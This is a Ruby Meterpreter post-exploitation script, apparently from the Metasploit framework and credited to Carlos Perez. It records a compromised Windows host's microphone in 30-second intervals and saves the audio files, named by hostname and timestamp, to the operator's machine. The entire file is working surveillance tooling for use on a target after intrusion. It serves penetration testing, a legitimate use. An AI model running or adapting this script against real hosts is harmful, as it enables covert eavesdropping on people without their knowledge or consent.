# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

@client = client
log_folder = nil
intervals = 1
data = nil
# 30 second durations to keep data moved small and minimize problems.
duration = 30
@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-l" => [ true , "Specify a alternate folder to save sound files to."],
	"-i" => [ true , "Number of 30 second intervals to record."]
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
	print_line "Meterpreter Script for recording in intervals the sound capture by a target host microphone."
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Function for creating log folder, returns path of folder.
#-------------------------------------------------------------------------------
def log_folder_create(log_path = nil)
	#Get hostname
	host = @client.sys.config.sysinfo["Computer"]

	# Create Filename info to be appended to downloaded files
	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

	# Create a directory for the logs
	if log_path
		logs = ::File.join(log_path, 'logs', "sound_recorder", host + filenameinfo )
	else
		logs = ::File.join(Msf::Config.log_directory, "scripts", "sound_recorder", host + filenameinfo )
	end

	# Create the log directory
	::FileUtils.mkdir_p(logs)
	return logs
end

# Function for converting a number of seconds to time in minutes
#-------------------------------------------------------------------------------
def convert_seconds_to_time(seconds)
	total_minutes = seconds / 1.minutes
	seconds_in_last_minute = seconds - total_minutes.minutes.seconds
	"#{total_minutes}m #{seconds_in_last_minute}s"
end
################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-l"
		if ::File.directory? val
			log_folder = log_folder_create(val)
		else
			print_error("Option provided #{val} is not a folder!")
			raise Rex::Script::Completed
		end
	when "-i"
		intervals = val.to_i
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i

# Create Folder for logs and get path for logs
if not log_folder
	log_folder = log_folder_create
end
print_status("Saving recorded audio to #{log_folder}")
print_status("Recording a total of #{convert_seconds_to_time(intervals*30)}")
(1..intervals).each do |i|
	# Set file name
	file_name = client.sys.config.sysinfo["Computer"] <<"_"<< i.to_s << ".wav"

	# Set path for file
	path = ::File.join(log_folder,file_name)

	# Record audio
	data = @client.webcam.record_mic(duration)

	# Check if we got data if not we error and exit
	if (data)
		::File.open( path, 'wb' ) do |fd|
			fd.write( data )
		end
		print_good( "\tAudio saved to: #{file_name}" )
	else
		print_error("There appeats a microphone is not present or muted!")
		raise Rex::Script::Completed
	end
end
